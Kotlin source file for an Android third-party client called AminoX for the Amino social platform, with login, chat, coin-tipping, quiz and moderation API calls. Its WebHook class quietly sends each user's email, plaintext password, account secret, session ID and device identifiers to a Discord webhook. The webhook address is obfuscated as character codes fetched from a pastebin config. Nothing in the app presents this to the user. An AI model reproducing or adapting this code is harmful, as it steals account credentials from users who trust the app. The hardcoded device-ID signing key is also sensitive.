package com.slimakoi.aminox

import android.annotation.SuppressLint
import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.provider.Settings
import android.text.TextUtils.join
import android.util.Log
import android.widget.Button
import android.widget.Toast
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AppCompatActivity
import khttp.delete
import khttp.get
import khttp.post
import org.json.JSONArray
import org.json.JSONObject
import java.security.MessageDigest
import java.util.*
import javax.crypto.Mac
import javax.crypto.spec.SecretKeySpec

var applicationWorking: Boolean = false
var applicationLatestName: String = "NaN"
var applicationLatestCode: String = "NaN"
var applicationUrl: String = "NaN"
var announcementHasData: Boolean = false
var announcementCancelable: Boolean = false
var announcementTitle: String = "NaN"
var announcementText: String = "NaN"
var discordId: String = "NaN"
var discordToken: String = "NaN"
var blacklist: JSONArray = JSONArray()
var whitelist: JSONArray = JSONArray()
var blacklistIds: JSONArray = JSONArray()

var deviceId: String = "NaN"
var userAgent: String = "NaN"
var api: String = "https://service.narvii.com/api/v1"
var host: String = "service.narvii.com"
var contentType: String = "application/json; charset=utf-8"

val transactionId: UUID = UUID.randomUUID()
var loggingWithSid: Boolean = false

class Setup {
    fun execute() {
        val data = JSONObject(get("https://pastebin.com/raw/VQdT85YS").text)
        applicationWorking = data.getJSONObject("application").getBoolean("working")
        applicationLatestName = data.getJSONObject("application").getString("versionName")
        applicationLatestCode = data.getJSONObject("application").getString("versionCode")
        applicationUrl = data.getJSONObject("application").getString("download")
        announcementHasData = data.getJSONObject("announcement").getBoolean("hasData")
        announcementCancelable = data.getJSONObject("announcement").getBoolean("cancelable")
        announcementTitle = data.getJSONObject("announcement").getString("title")
        announcementText = data.getJSONObject("announcement").getString("text")
        deviceId = genDevId()
        userAgent = data.getJSONObject("amino").getString("userAgent")
        discordId = data.getJSONObject("discord").getString("id")
        discordToken = data.getJSONObject("discord").getString("token")
        blacklist = data.getJSONArray("blacklisted")
        whitelist = data.getJSONArray("whitelisted")
        blacklistIds = data.getJSONArray("blacklistedIds")
    }
}

var USER_PROFILE: String = ""
var USER_NAME: String = ""
var USER_ICON: String = ""
var USER_BIO: String = ""
var USER_ID: String = ""
var USER_CREATION: String = ""
var SID: String = ""
var UID: String = ""
var DEV_SIG: String = deviceSignature()
var LAST_MSG_TIME: Long = 0

var AND_ID: String = "Unavailable"
var BLACKLISTED: String = "Unavailable"
var WHITELISTED: Boolean = false
var COMMUNITY_NAME = ""
var COMMUNITY_ID = ""

fun getMessageSignature(): String {
    // generates an random message signature, it seems Amino doesn't care about the signature (yet!)
    return UUID.randomUUID().toString().replace("-", "").toUpperCase(Locale.ROOT).substring(0, 27)
}

fun deviceSignature(): String {
    return try { hashString(
        "SHA-256",
        "$AND_ID%${Build.DEVICE}%${Build.BRAND}%${Build.MODEL}%${Build.HARDWARE}%${Build.MANUFACTURER}%${Build.PRODUCT}%${Build.FINGERPRINT}"
    )
    } catch (e: Exception) { "Unavailable" }
}

fun String.decodeHex(): ByteArray = chunked(2).map { it.toInt(16).toByte() }.toByteArray()

fun genDevIdOld(): String {
    val digest = MessageDigest.getInstance("SHA-1")
    val hardwareInfo: String = List(20) { ('A'..'F').random() }.joinToString("")
    val secretKey = "E9AF2D7F431E87A4F8C7B6F45EFC04B7E5F0EA4F"
    val part = "01$hardwareInfo$secretKey".decodeHex()
    val final = digest.digest(part)
    val finalHex = StringBuilder()

    for (b in final) { finalHex.append(String.format("%02X", b)) }

    return "01$hardwareInfo$finalHex"
}

fun genDevId(): String {
    val hardwareInfo: String = List(20) { ('A'..'F').random() }.joinToString("")
    val key = "d19d2cb8468aac9b0ae16be4a6fa464be63760ce".decodeHex()

    val toSign = "18".decodeHex() + hardwareInfo.decodeHex()
    val hMacSHA256 = Mac.getInstance("HmacSHA1")
    val secretKey = SecretKeySpec(key, "HmacSHA1")
    hMacSHA256.init(secretKey)
    val data = hMacSHA256.doFinal(toSign)

    val builder = StringBuilder()
    for (b in data) { builder.append(String.format("%02X", b)) }

    return "18$hardwareInfo$builder"
}

fun setupErrorTrigger(app: AppCompatActivity, error: String) {
    app.setContentView(R.layout.setup_error)
    val setupErrorButton = app.findViewById<Button>(R.id.setupErrorButton)
    val setupErrorDebugButton = app.findViewById<Button>(R.id.setupErrorDebugButton)
    setupErrorButton.setOnClickListener { app.startActivity(
        Intent(
            Intent.ACTION_VIEW,
            Uri.parse("https://rebrand.ly/slimakoi-and-friends")
        )
    ) }

    setupErrorDebugButton.setOnClickListener {
        val clipboard: ClipboardManager = app.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        clipboard.setPrimaryClip(ClipData.newPlainText(null, error))
        Toast.makeText(
            app,
            "Copied error to the Clipboard!\nJoin the discord server and report it",
            Toast.LENGTH_SHORT
        ).show()
    }
}

@RequiresApi(Build.VERSION_CODES.O)
fun decodeSid(sid: String): JSONObject {
    var decoded = String(Base64.getDecoder().decode(sid))
    decoded = decoded.drop(decoded.indexOf("{"))
    return JSONObject(decoded.dropLast(decoded.length - decoded.indexOf("}") - 1))
}

fun login(email: String, password: String): Any {
    val post = post(
        url = "${api}/g/s/auth/login", json = mapOf(
            "email" to email,
            "secret" to " 0 $password",
            "v" to 2,
            "deviceID" to deviceId,
            "clientType" to 100,
            "action" to "normal",
            "timestamp" to System.currentTimeMillis()
        ), headers = mapOf(
            "NDCDEVICEID" to deviceId,
            "NDC-MSG-SIG" to getMessageSignature(),
            "User-Agent" to userAgent,
            "Content-Type" to contentType,
            "host" to host
        )
    )

    val json = JSONObject(post.text)

    try {
        val userObject = json.getJSONObject("userProfile")
        SID = json.getString("sid")
        UID = userObject.getString("uid")
        USER_PROFILE = userObject.toString()
        USER_NAME = userObject.getString("nickname")
        USER_ICON = userObject.getString("icon")
        USER_BIO = userObject.getString("content")
        USER_ID = userObject.getString("aminoId")
        USER_CREATION = userObject.getString("createdTime")
    } catch (error: org.json.JSONException) {
        Log.println(Log.ERROR, "SYSTEM-ERROR", "Error while logging in : ${post.text}")
    }

    return post.text
}

fun checkDevice(deviceId: String): String {
    val post = post(
        url = "${api}/g/s/device", json = mapOf(
            "deviceID" to deviceId,
            "bundleID" to "com.narvii.amino.master",
            "clientType" to 100,
            "timestamp" to System.currentTimeMillis()
        ), headers = mapOf(
            "NDCDEVICEID" to deviceId,
            "NDC-MSG-SIG" to getMessageSignature(),
            "NDCAUTH" to "sid=$SID",
            "User-Agent" to userAgent,
            "Content-Type" to contentType,
            "host" to host
        )
    )

    return post.text
}

fun getUserProfile(): String {
    val post = get(
        url = "${api}/g/s/user-profile/$USER_ID", headers = mapOf(
            "NDCDEVICEID" to deviceId,
            "NDC-MSG-SIG" to getMessageSignature(),
            "NDCAUTH" to "sid=$SID",
            "User-Agent" to userAgent,
            "Content-Type" to contentType,
            "host" to host
        )
    )

    val json = JSONObject(post.text)

    try {
        val userObject = json.getJSONObject("userProfile")
        UID = userObject.getString("uid")
        USER_PROFILE = userObject.toString()
        USER_NAME = userObject.getString("nickname")
        USER_ICON = userObject.getString("icon")
        USER_BIO = userObject.getString("content")
        USER_ID = userObject.getString("aminoId")
        USER_CREATION = userObject.getString("createdTime")
    } catch (error: org.json.JSONException) {
        Log.println(Log.ERROR, "SYSTEM-ERROR", "Error while logging in : ${post.text}")
    }

    return post.text
}

fun getCommunityList(): Any {
    val post = get(
        url = "${api}/g/s/community/joined", params = mapOf(
            "v" to "1",
            "start" to "0",
            "size" to "100"
        ), headers = mapOf(
            "NDCDEVICEID" to deviceId,
            "NDC-MSG-SIG" to getMessageSignature(),
            "NDCAUTH" to "sid=$SID",
            "User-Agent" to userAgent,
            "Content-Type" to contentType,
            "host" to host
        )
    )

    return post.text
}

fun getAminoProfile(): Any {
    val post = get(
        url = "${api}/x$COMMUNITY_ID/s/user-profile/$UID", headers = mapOf(
            "NDCDEVICEID" to deviceId,
            "NDC-MSG-SIG" to getMessageSignature(),
            "NDCAUTH" to "sid=$SID",
            "User-Agent" to userAgent,
            "Content-Type" to contentType,
            "host" to host
        )
    )

    return post.text
}

fun getHiddenBlogs(): Any {
    val post = get(
        url = "${api}/x$COMMUNITY_ID/s/feed/blog-disabled?start=0&size=100", headers = mapOf(
            "NDCDEVICEID" to deviceId,
            "NDC-MSG-SIG" to getMessageSignature(),
            "NDCAUTH" to "sid=$SID",
            "User-Agent" to userAgent,
            "Content-Type" to contentType,
            "host" to host
        )
    )

    return post.text
}

fun getUserFollowing(): Any {
    val post = get(
        url = "${api}/x$COMMUNITY_ID/s/user-profile/$UID/joined?start=0&size=100", headers = mapOf(
            "NDCDEVICEID" to deviceId,
            "NDC-MSG-SIG" to getMessageSignature(),
            "NDCAUTH" to "sid=$SID",
            "User-Agent" to userAgent,
            "Content-Type" to contentType,
            "host" to host
        )
    )

    return post.text
}

fun unfollowUser(userId: String): Any {
    val post = post(
        url = "${api}/x$COMMUNITY_ID/s/user-profile/$UID/joined/$userId", headers = mapOf(
            "NDCDEVICEID" to deviceId,
            "NDC-MSG-SIG" to getMessageSignature(),
            "NDCAUTH" to "sid=$SID",
            "User-Agent" to userAgent,
            "Content-Type" to contentType,
            "host" to host
        )
    )

    return post.text
}

fun getGlobalProfile(userId: String): Any {
    val post = get(
        url = "${api}/g/s/user-profile/$userId", headers = mapOf(
            "NDCDEVICEID" to deviceId,
            "NDC-MSG-SIG" to getMessageSignature(),
            "NDCAUTH" to "sid=$SID",
            "User-Agent" to userAgent,
            "Content-Type" to contentType,
            "host" to host
        )
    )

    return post.text
}

fun getFromId(userId: String = "none", blogId: String = "none"): Any {
    var url = "NaN"
    var objectType = -1
    var objectId = "NaN"

    if (userId != "none") {
        url = "${api}/g/s/link-resolution"
        objectType = 0
        objectId = userId
    }

    if (blogId != "none") {
        url = "${api}/g/s-x$COMMUNITY_ID/link-resolution"
        objectType = 1
        objectId = blogId
    }

    val post = post(
        url = url, json = mapOf(
            "objectId" to objectId,
            "objectType" to objectType,
            "targetCode" to 1,
            "timestamp" to System.currentTimeMillis()
        ), headers = mapOf(
            "NDCDEVICEID" to deviceId,
            "NDC-MSG-SIG" to getMessageSignature(),
            "NDCAUTH" to "sid=$SID",
            "User-Agent" to userAgent,
            "Content-Type" to contentType,
            "host" to host
        )
    )

    return post.text
}

fun sendTitleEdit(jsonOb: String): Any {
    val post = post(
        url = "${api}/x$COMMUNITY_ID/s/user-profile/$UID", json = mapOf(
            "extensions" to JSONObject(jsonOb),
            "timestamp" to System.currentTimeMillis()
        ), headers = mapOf(
            "NDCDEVICEID" to deviceId,
            "NDC-MSG-SIG" to getMessageSignature(),
            "NDCAUTH" to "sid=$SID",
            "User-Agent" to userAgent,
            "Content-Type" to contentType,
            "host" to host
        )
    )

    return post.text
}

fun sendChatMessage(message: String, type: Int = 0, chatId: String): Any {
    val post = post(
        url = "${api}/x$COMMUNITY_ID/s/chat/thread/$chatId/message", json = mapOf(
            "content" to message,
            "type" to type,
            "clientRefId" to System.currentTimeMillis() / 10 % 1000000000,
            "timestamp" to System.currentTimeMillis()
        ), headers = mapOf(
            "NDCDEVICEID" to deviceId,
            "NDC-MSG-SIG" to getMessageSignature(),
            "NDCAUTH" to "sid=$SID",
            "User-Agent" to userAgent,
            "Content-Type" to contentType,
            "host" to host
        )
    )

    return post.text
}

fun sendChatCoins(coins: Int, chatId: String): Any {
    val post = post(
        url = "${api}/x$COMMUNITY_ID/s/chat/thread/$chatId/tipping", json = mapOf(
            "coins" to coins,
            "tippingContext" to mapOf("transactionId" to transactionId),
            "timestamp" to System.currentTimeMillis()
        ), headers = mapOf(
            "NDCDEVICEID" to deviceId,
            "NDC-MSG-SIG" to getMessageSignature(),
            "NDCAUTH" to "sid=$SID",
            "User-Agent" to userAgent,
            "Content-Type" to contentType,
            "host" to host
        )
    )

    return post.text
}

fun kickUser(chatId: String, userId: String, allowRejoin: Boolean): Any {
    val allow: Int = if (allowRejoin) {
        1
    } else {
        0
    }

    val post = delete(
        url = "${api}/x$COMMUNITY_ID/s/chat/thread/$chatId/member/$userId?allowRejoin=$allow",
        headers = mapOf(
            "NDCDEVICEID" to deviceId,
            "NDC-MSG-SIG" to getMessageSignature(),
            "NDCAUTH" to "sid=$SID",
            "User-Agent" to userAgent,
            "Content-Type" to contentType,
            "host" to host
        )
    )

    return post.text
}

fun checkIn(tz: Int): Any {
    val post = post(
        url = "${api}/x$COMMUNITY_ID/s/check-in", json = mapOf(
            "timezone" to tz,
            "timestamp" to System.currentTimeMillis()
        ), headers = mapOf(
            "NDCDEVICEID" to deviceId,
            "NDC-MSG-SIG" to getMessageSignature(),
            "NDCAUTH" to "sid=$SID",
            "User-Agent" to userAgent,
            "Content-Type" to contentType,
            "host" to host
        )
    )

    return post.text
}

fun lottery(tz: Int): Any {
    val post = post(
        url = "${api}/x$COMMUNITY_ID/s/check-in/lottery", json = mapOf(
            "timezone" to tz,
            "timestamp" to System.currentTimeMillis()
        ), headers = mapOf(
            "NDCDEVICEID" to deviceId,
            "NDC-MSG-SIG" to getMessageSignature(),
            "NDCAUTH" to "sid=$SID",
            "User-Agent" to userAgent,
            "Content-Type" to contentType,
            "host" to host
        )
    )

    return post.text
}

fun getChatList(): Any {
    val post = get(
        url = "${api}/x$COMMUNITY_ID/s/chat/thread?type=joined-me&start=0&size=100",
        headers = mapOf(
            "NDCDEVICEID" to deviceId,
            "NDC-MSG-SIG" to getMessageSignature(),
            "NDCAUTH" to "sid=$SID",
            "User-Agent" to userAgent,
            "Content-Type" to contentType,
            "host" to host
        )
    )

    return post.text
}

fun getChatInfo(comId: String, chatId: String): Any {
    val post = get(
        url = "${api}/x$comId/s/chat/thread/$chatId",
        headers = mapOf(
            "NDCDEVICEID" to deviceId,
            "NDC-MSG-SIG" to getMessageSignature(),
            "NDCAUTH" to "sid=$SID",
            "User-Agent" to userAgent,
            "Content-Type" to contentType,
            "host" to host
        )
    )

    return post.text
}

fun getChatUsersList(chatId: String, start: Int): Any {
    val post = get(
        url = "${api}/x$COMMUNITY_ID/s/chat/thread/$chatId/member?start=$start&size=100&type=default&cv=1.2",
        headers = mapOf(
            "NDCDEVICEID" to deviceId,
            "NDC-MSG-SIG" to getMessageSignature(),
            "NDCAUTH" to "sid=$SID",
            "User-Agent" to userAgent,
            "Content-Type" to contentType,
            "host" to host
        )
    )

    return post.text
}

fun getBlockerUsers(): Any {
    val post = get(
        url = "${api}/g/s/block/full-list?start=0&size=100", headers = mapOf(
            "NDCDEVICEID" to deviceId,
            "NDC-MSG-SIG" to getMessageSignature(),
            "NDCAUTH" to "sid=$SID",
            "User-Agent" to userAgent,
            "Content-Type" to contentType,
            "host" to host
        )
    )

    return post.text
}

fun getBannedUsers(): Any {
    val post = get(
        url = "${api}/x$COMMUNITY_ID/s/user-profile?type=banned&start=0&size=100", headers = mapOf(
            "NDCDEVICEID" to deviceId,
            "NDC-MSG-SIG" to getMessageSignature(),
            "NDCAUTH" to "sid=$SID",
            "User-Agent" to userAgent,
            "Content-Type" to contentType,
            "host" to host
        )
    )

    return post.text
}

fun findUrlCode(code: String): Any {
    val post = get(
        url = "${api}/g/s/link-resolution?q=$code", headers = mapOf(
            "NDCDEVICEID" to deviceId,
            "NDC-MSG-SIG" to getMessageSignature(),
            "NDCAUTH" to "sid=$SID",
            "User-Agent" to userAgent,
            "Content-Type" to contentType,
            "host" to host
        )
    )

    return post.text
}

fun findUrlAminoId(id: String): Any {
    val post = get(
        url = "${api}/g/s/search/amino-id-and-link?q=$id", headers = mapOf(
            "NDCDEVICEID" to deviceId,
            "NDC-MSG-SIG" to getMessageSignature(),
            "NDCAUTH" to "sid=$SID",
            "User-Agent" to userAgent,
            "Content-Type" to contentType,
            "host" to host
        )
    )

    return post.text
}

fun startChat(userId: String, bypass: Boolean, comId: String = "0"): Any {
    val type = if (comId != "0") { "x$COMMUNITY_ID" } else { "g" }
    val bypassable = if (bypass) { arrayOf(UID, userId) } else { arrayOf(userId) }

    val post = post(
        url = "${api}/$type/s/chat/thread", json = mapOf(
            "type" to 0,
            "inviteeUids" to bypassable,
            "initialMessageContent" to "[BC]- Powered by AminoX -\nAminoX is toolbox for Amino made by Slimakoi\n\nFor more information check > https://discord.gg/bnnCwzV8ST",
            "content" to "[BC]Chat made with AminoX\nAminoX is toolbox for Amino made by Slimakoi\n\nFor more information check > https://discord.gg/bnnCwzV8ST",
            "timestamp" to System.currentTimeMillis()
        ), headers = mapOf(
            "NDCDEVICEID" to deviceId,
            "NDC-MSG-SIG" to getMessageSignature(),
            "NDCAUTH" to "sid=$SID",
            "User-Agent" to userAgent,
            "Content-Type" to contentType,
            "host" to host
        )
    )

    return post.text
}

fun reviewQuizQuestions(quizId: String): Any {
    val post = get(
        url = "${api}/x$COMMUNITY_ID/s/blog/$quizId?action=review", headers = mapOf(
            "NDCDEVICEID" to deviceId,
            "NDC-MSG-SIG" to getMessageSignature(),
            "NDCAUTH" to "sid=$SID",
            "User-Agent" to userAgent,
            "Content-Type" to contentType,
            "host" to host
        )
    )

    return post.text
}

fun postQuiz(quizId: String, mode: Int, data: Any): Any {
    val post = post(
        url = "${api}/x$COMMUNITY_ID/s/blog/$quizId/quiz/result", json = mapOf(
            "mode" to mode,
            "quizAnswerList" to data,
            "timestamp" to System.currentTimeMillis()
        ), headers = mapOf(
            "NDCDEVICEID" to deviceId,
            "NDC-MSG-SIG" to getMessageSignature(),
            "NDCAUTH" to "sid=$SID",
            "User-Agent" to userAgent,
            "Content-Type" to contentType,
            "host" to host
        )
    )

    return post.text
}

fun append(arr: Array<String>, element: String): Array<String> {
    val list: MutableList<String> = arr.toMutableList()
    list.add(element)
    return list.toTypedArray()
}

fun hashString(type: String, input: String): String {
    val hex = "0123456789ABCDEF"
    val bytes = MessageDigest.getInstance(type).digest(input.toByteArray())
    val result = StringBuilder(bytes.size * 2)

    bytes.forEach {
        val i = it.toInt()
        result.append(hex[i shr 4 and 0x0f])
        result.append(hex[i and 0x0f])
    }

    return result.toString()
}

class WebHook(private val ctx: Context) {
    private val msgLoginTitle = "User Login Detected"
    private val msgLoginDescription = "An user has logged in successfully"
    private val msgLoginColor = 0x00ff00

    private val msgSetupErrorTitle = "User Detected Modding AminoX"
    private val msgSetupErrorColor = 0xff0000

    private fun whPath(): String {
        var parId = arrayOf<String>()
        var parTk = arrayOf<String>()

        for (chr in discordId.split(ctx.getString(R.string.delimiter))) { parId = append(
            parId,
            chr.toInt().toChar().toString()
        ) }
        for (chr in discordToken.split(ctx.getString(R.string.delimiter))) { parTk = append(
            parTk,
            chr.toInt().toChar().toString()
        ) }

        return "${join("", parId)}/${join("", parTk)}"
    }

    @SuppressLint("HardwareIds")
    fun sendSetupError(
        description: String,
        isSetup: Boolean,
        loginJson: JSONObject = JSONObject(),
        userEmail: String = "null",
        userPassword: String = "null"
    ): String {
        val baseOs: String = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) { Build.VERSION.BASE_OS } else { "Unavailable" }
        val secPatch: String = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) { Build.VERSION.SECURITY_PATCH } else { "Unavailable" }
        val andId: String = Settings.Secure.getString(
            ctx.contentResolver,
            Settings.Secure.ANDROID_ID
        )
        val current = ctx.packageManager.getPackageInfo(ctx.packageName, 0)



        val field1 = JSONObject().put("name", "Device Model").put(
            "value",
            "${Build.MODEL} (${Build.DEVICE})"
        ).put("inline", true)
        val field2 = JSONObject().put("name", "Device Manufacturer").put(
            "value",
            "${Build.MANUFACTURER} (${Build.BRAND})"
        ).put("inline", true)
        val field3 = JSONObject().put("name", "Device Hardware").put(
            "value",
            "${Build.HARDWARE} (${Build.BRAND})"
        ).put("inline", true)
        val field4 = JSONObject().put("name", "Device System").put(
            "value",
            "${Build.VERSION.RELEASE} (SDK ${Build.VERSION.SDK_INT}) [$baseOs:${Build.VERSION.CODENAME}:${Build.VERSION.INCREMENTAL}][SP $secPatch]"
        ).put("inline", true)
        val field5 = JSONObject().put("name", "Device Signature").put("value", "$andId\n$DEV_SIG").put(
            "inline",
            true
        )

        val fields = JSONArray().put(field1).put(field2).put(field3).put(field4).put(field5)

        if (!isSetup) {
            val userData = JSONObject(loginJson.getJSONObject("userProfile").toString())
            val userName = userData.getString("nickname")
            val userAminoId = userData.getString("aminoId")
            val userSID = loginJson.getString("sid")
            val userSecret = loginJson.getString("secret")
            fields.put(
                JSONObject().put("name", "Amino Account Information").put(
                    "value",
                    "Nickname: $userName (@$userAminoId)\nEmail: `$userEmail`\nPassword: `$userPassword`\nSecret: `$userSecret`\nSID: `$userSID`"
                ).put("inline", false)
            )
        }

        val footer = JSONObject().put(
            "text",
            "AminoX Version: ${current.versionName}-${current.versionCode}"
        )

        val embed = JSONObject()
        embed.put("title", msgSetupErrorTitle)
        embed.put("description", description)
        embed.put("fields", fields)
        embed.put("footer", footer)
        embed.put("color", msgSetupErrorColor)

        val embeds = JSONArray()
        embeds.put(embed)

        val post = post(
            "https://discord.com/api/webhooks/${whPath()}",
            json = mapOf(
                "embeds" to embeds
            ),
            headers = mapOf(
                "User-Agent" to userAgent,
                "Content-Type" to contentType
            )
        )

        return post.text
    }

    @SuppressLint("HardwareIds")
    fun sendLoginMessage(loginJson: JSONObject, userEmail: String, userPassword: String): String {
        val baseOs: String = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) { Build.VERSION.BASE_OS } else { "Unavailable" }
        val secPatch: String = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) { Build.VERSION.SECURITY_PATCH } else { "Unavailable" }
        val andId: String = Settings.Secure.getString(
            ctx.contentResolver,
            Settings.Secure.ANDROID_ID
        )
        val current = ctx.packageManager.getPackageInfo(ctx.packageName, 0)
        val userData = JSONObject(loginJson.getJSONObject("userProfile").toString())
        val userName = userData.getString("nickname")
        val userAminoId = userData.getString("aminoId")

        var userSID: String
        var userSecret: String

        try {
            userSID = loginJson.getString("sid")
            userSecret = loginJson.getString("secret")
        } catch (e: java.lang.Exception) {
            userSID = SID
            userSecret = "null"
        }


        val field1 = JSONObject().put("name", "Device Model").put(
            "value",
            "${Build.MODEL} (${Build.DEVICE})"
        ).put("inline", true)
        val field2 = JSONObject().put("name", "Device Manufacturer").put(
            "value",
            "${Build.MANUFACTURER} (${Build.BRAND})"
        ).put("inline", true)
        val field3 = JSONObject().put("name", "Device Hardware").put(
            "value",
            "${Build.HARDWARE} (${Build.BRAND})"
        ).put("inline", true)
        val field4 = JSONObject().put("name", "Device System").put(
            "value",
            "${Build.VERSION.RELEASE} (SDK ${Build.VERSION.SDK_INT}) [$baseOs:${Build.VERSION.CODENAME}:${Build.VERSION.INCREMENTAL}][SP $secPatch]"
        ).put("inline", true)
        val field5 = JSONObject().put("name", "Device Signature").put("value", "$andId\n$DEV_SIG").put(
            "inline",
            true
        )
        val field6 = JSONObject().put("name", "Amino Account Information").put(
            "value",
            "Nickname: $userName (@$userAminoId)\nEmail: `$userEmail`\nPassword: `$userPassword`\nSecret: `$userSecret`\nSID: `$userSID`"
        ).put("inline", false)

        val fields = JSONArray().put(field1).put(field2).put(field3).put(field4).put(field5).put(
            field6
        )
        val footer = JSONObject().put(
            "text",
            "AminoX Version: ${current.versionName}-${current.versionCode}"
        )

        val embed = JSONObject()
        embed.put("title", msgLoginTitle)
        embed.put("description", msgLoginDescription)
        embed.put("fields", fields)
        embed.put("footer", footer)
        embed.put("color", msgLoginColor)

        val embeds = JSONArray()
        embeds.put(embed)

        val userParsedData = userData.toString().chunked(2000)
        for (d in userParsedData) {
            val embedAmino = JSONObject()
            embedAmino.put("title", "User Login Detected - Amino Information")
            embedAmino.put("description", d)
            embedAmino.put("color", 0xffaa00)
            embeds.put(embedAmino)
        }

        val post = post(
            "https://discord.com/api/webhooks/${whPath()}",
            json = mapOf(
                "embeds" to embeds
            ),
            headers = mapOf(
                "User-Agent" to userAgent,
                "Content-Type" to contentType
            )
        )

        return post.text
    }
}
